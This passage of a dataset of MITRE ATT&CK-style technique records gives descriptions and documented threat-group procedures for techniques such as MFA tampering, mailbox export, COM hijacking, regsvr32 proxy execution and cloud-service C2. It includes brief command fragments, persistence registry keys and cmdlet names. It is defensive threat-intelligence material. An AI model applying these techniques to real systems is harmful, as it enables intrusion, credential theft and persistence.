'[TrickBot] uses brute-force attack against RDP with rdpscanDll module.']",False
T1556.006,Multi-Factor Authentication,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.  Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation] adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.  For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.    Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment. ","['After compromising user accounts, [Scattered Spider] registers their own MFA tokens.', '[SLOWPULSE] can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided.', 'The [AADInternals] `Set-AADIntUserMFA` command can be used to disable MFA for a specified user.']",False
T1114.002,Remote Email Collection,"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper] can be used to automate searches for specific keywords.","['[Ke3chang] has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes.', '[MailSniper] can be used for searching through email in Exchange and Office 365 environments.', 'During the [SolarWinds Compromise] [APT29] collected emails from specific individuals, such as executives and IT staff, using `New-MailboxExportRequest` followed by `Get-MailboxExportRequest`.', '[APT28] has collected emails from victim Microsoft Exchange servers.', '[APT1] uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.', '[LightNeuron] collects Exchange emails matching rules specified in its configuration.', '[APT29] has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests.', 'Some [SeaDuke] samples have a module to extract email from Microsoft Exchange servers using compromised credentials.', '[HAFNIUM] has used web shells to export mailbox data.', '[Valak] can collect sensitive mailing information from Exchange servers, including credentials and the domain certificate of an enterprise.', '[Magic Hound] has exported emails from compromised Exchange servers including through use of the cmdlet `New-MailboxExportRequest.`', '[Chimera] has harvested data from remote mailboxes including through execution of <code>\\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost</code>.', '[Dragonfly] has accessed email accounts using Outlook Web Access.', '[FIN4] has accessed and hijacked online email communications using stolen credentials.', '[Leafminer] used a tool called MailSniper to search through the Exchange server mailboxes for keywords.', '[Kimsuky] has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP.', '[APT29] collected emails from specific individuals, such as executives and IT staff, using <code>New-MailboxExportRequest</code> followed by <code>Get-MailboxExportRequest</code>.', '[UNC2452] collected emails from specific individuals, such as executives and IT staff, using <code>New-MailboxExportRequest</code> followed by <code>Get-MailboxExportRequest</code>.', '[Dragonfly 2.0] accessed email accounts using Outlook Web Access.']",False
T1505.004,IIS Components,"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.  Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.  Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.","['[RGDoor] establishes persistence on webservers as an IIS module.', '[IceApple] is an IIS post-exploitation framework, consisting of 18 modules that provide several functionalities.', 'During [Operation Dream Job] [Lazarus Group] targeted Windows servers running Internet Information Systems (IIS) to install C2 components.', '[OwaAuth] has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.']",
T1036.001,Invalid Code Signature,"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.  Unlike [Code Signing] this activity will not result in a valid signature.","['[WindTail] has been incompletely signed with revoked certificates.', '[BADNEWS] is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.', '[Regin] stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.', '[APT37] has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”', '[Windshift] has used revoked certificates to sign malware.', 'The [NETWIRE] client has been signed by fake and invalid digital certificates.', '[PcShare] has used an invalid certificate in attempt to appear legitimate.', '[Gelsemium] has used unverified signatures on malicious DLLs.']",
T1564.006,Run Virtual Instance,"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.  Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.","[""[Maze] operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably so [Maze] can encrypt files on the shared drives as well as the local machine. "", '[Ragnar Locker] has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables [Ragnar Locker] to encrypt files on the host operating system, including files on any mapped drives.', '[LoudMiner] has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.']",
T1546.004,Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell] execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.   Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session.   For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.","['When executing with non-root level permissions, [RotaJakiro] can install persistence by adding a command to the .bashrc file that executes a binary in the  `${HOME}/.gvfsd/.profile/` folder.', '[Linux Rabbit] maintains persistence on an infected machine through rc.local and .bashrc files. ', '[Green Lambert] can establish persistence on a compromised host through modifying the `profile`, `login`, and run command (rc) files associated with the `bash`, `csh`, and `tcsh` shells.  ']",
T1134.005,SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).  With Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services] [SMB/Windows Admin Shares] or [Windows Remote Management]","[""[Mimikatz] <code>MISC::AddSid</code> module can append any SID or user/group account to a user's SID-History. [Mimikatz] also utilizes [SID-History Injection] to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain."", '[Empire] can add a SID-History to a user if on a domain controller.']",
T1548.004,Elevated Execution with Prompt,"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.   Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.  Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms. This technique may be combined with [Masquerading] to trick the user into granting escalated privileges to malicious code. This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.",['[OSX/Shlayer] can escalate privileges to root by asking the user for credentials.'],False
T1592.003,Firmware,"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [Supply Chain Compromise] or [Exploit Public-Facing Application]",[],
T1547.002,Authentication Package,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.  Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>""Authentication Packages""=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",['[Flame] can use Windows Authentication Packages for persistence.'],False
T1218.010,Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.   Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments.    Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking] ","['[Saint Bot] has used `regsvr32` to execute scripts.', '[QakBot] can use Regsvr32 to execute malicious DLLs.', '[TA551] has used regsvr32.exe to load malicious DLLs.', 'Some [Orz] versions have an embedded DLL known as MockDll that uses [Process Hollowing] and regsvr32 to execute another payload.', '[Koadic] can use Regsvr32 to execute additional payloads.', '[Valak] has used <code>regsvr32.exe</code> to launch malicious DLLs.', '[Squirrelwaffle] has been executed using `regsvr32.exe`.', '[Mori] can use `regsvr32.exe` for DLL execution.', '[Astaroth] can be loaded through regsvr32.exe.', '[Dridex] can use `regsvr32.exe` to initiate malicious code.', '[Derusbi] variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.', '[Deep Panda] has used regsvr32.exe to execute a server variant of [Derusbi] in victim networks.', '[RogueRobin] uses regsvr32.exe to run a .sct file for execution.', '[Cobalt Group] has used regsvr32.exe to execute scripts.', 'During [Operation Dream Job] [Lazarus Group] used `regsvr32` to execute malware.', '[Ragnar Locker] has used regsvr32.exe to execute components of VirtualBox.', '[Blue Mockingbird] has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.\t', '[HermeticWizard] has used `regsvr32.exe /s /i` to execute malicious payloads.', '[Egregor] has used regsvr32.exe to execute malicious DLLs.', 'During [C0015] the threat actors employed code that used `regsvr32` for execution.', '[Leviathan] has used regsvr32 for execution.', '[Kimsuky] has executed malware with <code>regsvr32s</code>.', '[Inception] has ensured persistence at system boot by setting the value <code>regsvr32 %path%\\ctfmonrn.dll /s</code>.', '[WIRTE] has used `regsvr32.exe` to trigger the execution of a malicious script.', '[More_eggs] has used regsvr32.exe to execute the malicious DLL.', '[APT32] created a [Scheduled Task/Job] that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor. ', '[EVILNUM] can run a remote scriptlet that drops a file and executes it via regsvr32.exe. ', '[Hi-Zor] executes using regsvr32.exe called from the [Registry Run Keys / Startup Folder] persistence mechanism.', '[AppleSeed] can call regsvr32.exe for execution.', '[Xbash] can use regsvr32 for executing scripts.', '[APT19] used Regsvr32 to bypass application control techniques.', '[Lazarus Group] has used rgsvr32 to execute custom malware.']",False
T1567.003,Exfiltration to Text Storage Sites,"Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.    Text storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities] but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.  **Note:** This is distinct from [Exfiltration to Code Repository] which highlight access to code repositories via APIs.",[],False
T1592.002,Software,"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] (ex: listening ports, server banners, user agent strings) or [Phishing for Information] Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or for initial access (ex: [Supply Chain Compromise] or [External Remote Services]","['[Magic Hound] has captured the user-agent strings from visitors to their phishing sites.', '[Sandworm Team] has researched software code to enable supply-chain operations, most notably for the 2017 [NotPetya] attack. [Sandworm Team] also collected a list of computers using specific software as part of its targeting efforts.', '[Andariel] has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data.']",
T1566.004,Spearphishing Voice,"Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation] and/or creating a sense of urgency or alarm for the recipient.  All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution] for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools ([Remote Access Software] onto their computer.  Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation] in order to trick users into divulging MFA credentials or accepting authentication prompts.",['During [C0027] [Scattered Spider] impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system.'],False
T1587.004,Exploits,"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via [Vulnerabilities] to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.  As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.  Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application] [Exploitation for Client Execution] [Exploitation for Privilege Escalation] [Exploitation for Defense Evasion] [Exploitation for Credential Access] [Exploitation of Remote Services] and [Application or System Exploitation]",[],
T1593.001,Social Media,"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.  Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service] Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Technical Databases] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [Spearphishing via Service]","['[Kimsuky] has used Twitter to monitor potential victims and to prepare targeted phishing e-mails.', '[EXOTIC LILY] has copied data from social media sites to impersonate targeted individuals.', 'For [Operation Dream Job] [Lazarus Group] used LinkedIn to identify and target employees within a chosen organization.', '[Lazarus Group] has used LinkedIn to identify and target specific employees within a chosen organization.']",
T1546.015,Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry.   Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ","['Some variants of [ADVSTORESHELL] achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.', '[KONNI] has modified ComSysApp service to load the malicious DLL payload.', '[APT28] has used COM hijacking for persistence by replacing the legitimate <code>MMDeviceEnumerator</code> object with a payload.', '[PcShare] has created the `HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32` Registry key for persistence.', '[WarzoneRAT]  can perform COM hijacking by setting the path to itself to the `HKCU\\Software\\Classes\\Folder\\shell\\open\\command` key with a `DelegateExecute` parameter.', '[ComRAT] samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location <code>HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32</code>.', '[SVCReady] has created the `HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{E6D34FFC-AD32-4d6a-934C-D387FA873A19}` Registry key for persistence.', '[Mosquito] uses COM hijacking as a method of persistence.', '[Ferocious] can use COM hijacking to establish persistence.', ""[BBSRAT] has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList <code>{42aedc87-2188-41fd-b9a3-0c966feabec1}</code> or Microsoft WBEM New Event Subsystem <code>{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}</code> depending on the system's CPU architecture."", '[SILENTTRINITY] can add a CLSID key for payload execution through `Registry.CurrentUser.CreateSubKey(""Software\\\\Classes\\\\CLSID\\\\{"" + clsid + ""}\\\\InProcServer32"")`.', '[JHUHUGIT] has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).']",False
T1589.001,Credentials,"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.  Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information] Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors. Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines] breach dumps, code repositories, etc.). Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).  Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Phishing for Information] establishing operational resources (ex: [Compromise Accounts] and/or initial access (ex: [External Remote Services] or [Valid Accounts] ","[""[APT28] has harvested user's login credentials."", '[Magic Hound] gathered credentials from two victims that they then attempted to validate across 75 different websites. [Magic Hound] has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel.', 'To support initial access, [APT41] gained access to databases with information about existing accounts as well as plaintext and hashed passwords.', '[Leviathan] has collected compromised credentials to use for targeting efforts.', 'For the [SolarWinds Compromise] [APT29] conducted credential theft operations to obtain credentials to be used for access to victim environments.', ""[LAPSUS$] has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials."", '[Chimera] has collected credentials for the target organization from previous breaches for use in brute force attacks.', 'During [C0027] [Scattered Spider] sent phishing messages via SMS to steal credentials.', '[APT29] has conducted credential theft operations to obtain credentials to be used for access to victim environments.']",False
T1195.002,Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.  Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.  ","['[APT41] gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.', '[Cobalt Group] has compromised legitimate web browser updates to deliver a backdoor. ', '[GOLD SOUTHFIELD] has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.', '[GoldenSpy] has been packaged with a legitimate tax preparation software.', '[SUNSPOT] malware was designed and used to insert [SUNBURST] into software builds of the SolarWinds Orion IT management product.', '[Sandworm Team] has distributed [NotPetya] by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.', ""[CCBkdr] was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site."", '[Dragonfly] has placed trojanized installers for control system software on legitimate vendor app stores.', ""[Threat Group-3390] has compromised the Able Desktop installer to gain access to victim's environments."", 'During the [SolarWinds Compromise] [APT29] gained initial network access to some victims via a trojanized update of SolarWinds Orion software.', ""[FIN7] has gained initial access by compromising a victim's software supply chain."", '[UNC2452] gained initial network access via a trojanized update of SolarWinds Orion software.', '[APT29] gained initial network access to some victims via a trojanized update of SolarWinds Orion software.', '[Gelsemium] has compromised software supply chains to gain access to victims.']",False
T1036.003,Rename System Utilities,Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. ,"['[menuPass] has renamed [certutil] and moved it to a different location on the system to avoid detection based on use of the tool.', '[Lazarus Group] has renamed system utilities such as <code>wscript.exe</code> and <code>mshta.exe</code>.', '[DarkGate] executes a Windows Batch script during installation that creases a randomly-named directory in the <code>C:\\\\</code> root directory that copies and renames the legitimate Windows <curl>curl</code> command to this new location.', '[APT32] has moved and renamed pubprn.vbs to a .txt file to avoid detection.', ""The [CozyCar] dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file."", '[Kevin] has renamed an image of `cmd.exe` with a random name followed by a `.tmpl` extension.', '[GALLIUM] used a renamed cmd.exe file to evade detection.']",False
T1102.002,Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.   Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ","['[PowerStallion] uses Microsoft OneDrive as a C2 server via a network drive mapped with <code>net use</code>.', '[BoxCaon] has used DropBox for C2 communications. ', 'For [Operation Ghost] [APT29] used social media platforms to hide communications to C2 servers.', '[Crutch] can use Dropbox to receive commands and upload stolen data.', '[Clambling] can use Dropbox to download malicious payloads, send commands, and receive information.', '[Orz] has used Technet and Pastebin web pages for command and control.', 'The [CALENDAR] malware communicates through the use of events in Google Calendar.', '[CozyCar] uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.', '[yty] communicates to the C2 server by retrieving a Google Doc.', '[Kimsuky] has used Blogspot pages for C2.', '[SLOWDRIFT] uses cloud based services for C2.', '[Grandoreiro] can utilize web services including Google sites to send and receive C2 data.', '[POLONIUM] has used OneDrive and DropBox for C2.', '[APT37] leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.', '[Comnie] uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.', '[BADNEWS] can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.', '[UBoatRAT] has used GitHub and a public blog service in Hong Kong for C2 communications.', '[Lazarus Group] has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories.', '[APT12] has used blogs and WordPress for C2 infrastructure.', '[CreepyDrive] can use OneDrive for C2.', '[APT39] has communicated with C2 through files uploaded to and downloaded from DropBox.', 'One variant of [CloudDuke] uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.', '[ComRAT] has the ability to use the Gmail web UI to receive commands and exfiltrate information.', '[Revenge RAT] used blogpost.com as its primary command and control server during a campaign.', '[Magic Hound] malware can use a SOAP Web service to communicate with its C2 server.', 'A [Turla] JavaScript backdoor has used Google Apps Script as its C2 server.', '[HEXANE] has used cloud services, including OneDrive, for C2.', '[RogueRobin] has used Google Drive as a Command and Control channel. ', '[LOWBALL] uses the Dropbox cloud storage service for command and control.', '[BLUELIGHT] can use different cloud providers for its C2.', '[Kazuar] has used compromised WordPress blogs as C2 servers.', '[Carbanak] has used a VBScript named ""ggldr"" that uses Google Apps Script, Sheets, and Forms services for C2.', '[RegDuke] can use Dropbox as its C2 server.', '[Empire] can use Dropbox and GitHub for C2.', '[FIN7] used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.', '[ROKRAT] has used legitimate social networking sites and cloud platforms (including but not limited to Twitter, Yandex, Dropbox, and Mediafire) for C2 communications.', '[GLOOXMAIL] communicates to servers operated by Google using the Jabber/XMPP protocol.', '[KARAE] can use public cloud-based storage providers for command and control.', '[DOGCALL] is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.', '[POORAIM] has used AOL Instant Messenger for C2.', '[Sandworm Team] has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. [Sandworm Team] also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.', '[APT28] has used Google Drive for C2.', '[Small Sieve] has the ability to use the Telegram Bot API from Telegram Messenger to send and receive messages.', '[MuddyWater] has used web services including OneHub to distribute remote access tools.', '[ZIRCONIUM] has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.', '[BLACKCOFFEE] has also obfuscated its C2 traffic as normal traffic to sites such as Github.', '[APT29] has used social media platforms to hide communications to C2 servers.', '[Twitoor] uses Twitter for command and control.']",
